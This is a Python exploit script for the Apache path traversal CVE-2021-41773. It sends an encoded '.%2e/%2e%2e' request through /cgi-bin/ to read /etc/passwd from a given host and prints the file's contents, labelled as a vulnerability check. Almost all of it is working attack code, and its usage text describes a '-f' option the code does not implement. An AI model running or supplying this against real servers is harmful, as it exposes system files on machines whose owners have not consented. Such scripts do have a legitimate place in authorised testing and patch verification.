#!/usr/bin/python3
# coding: utf-8
import os
import sys
import getopt
import socket
import os.path
import argparse
import requests
import urllib.request


parser = argparse.ArgumentParser()
parser.add_argument("--target", "-t", help="Host")
parser.add_argument("--port", "-p", help="Port")
parser.parse_args()
args = parser.parse_args()


def usage():
    print("Usage: CVE-2021-41773 options\n")
    print("     Only for one target: python CVE-2021-41773.py target_address\n")
    print("     -f For target list in file")
    print("         Example: python CVE-2021-41773.py -f target_address_list_filename")


def checkApache(target,port):
    
    if "443" in port:
        url = f'https://{target}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n'
    else:
        url = f'http://{target}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n'
    print(f'url {url}')
    
    req = urllib.request.Request(url)
    try: 
        salida = urllib.request.urlopen(req, timeout=10)
        contenido = salida.read().decode('utf-8')
        print("The output is:\n\n"+contenido)                
        if 'root:' in contenido:            
            print('Server %s IS VULNERABLE' % target )                
    except urllib.error.URLError as e:
        print('Server %s IS NOT VULNERABLE' % target)
    
if __name__ == "__main__":
    try:
        checkApache(args.target, args.port)
    except KeyboardInterrupt:
        print("Search interrupted by user..")
    #except:
      #  sys.exit()
